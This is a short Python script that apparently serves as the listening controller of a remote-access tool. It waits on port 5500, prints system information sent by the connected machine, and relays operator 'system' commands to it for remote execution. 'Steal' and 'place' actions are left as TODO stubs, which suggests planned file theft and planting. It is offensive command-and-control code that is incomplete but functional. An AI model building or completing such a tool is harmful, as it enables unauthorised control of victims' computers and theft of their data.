from socket import *

HOST = ""
PORT = 5500

def listen():
	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.bind((HOST, PORT))
	print("[*] Listening on port %s" % str(PORT))
	s.listen(10)
	sock, addr = s.accept()
	return sock

def main():
	sock = listen()
	data = sock.recv(1024).decode() # recv system info
	print(data)
	
	while sock:
		data = input("[>] ")

		if data != "":
			action = data.split()[0]
			response = b"[!] No response"

			if action == "system":
				sock.send(data.encode())
				response = sock.recv(1024)
				
			elif action == "steal":
				# TODO
				pass
			elif action == "place":
				# TODO
				pass
			else:
				pass

			print(response.decode())
			
		else:
			pass

main()
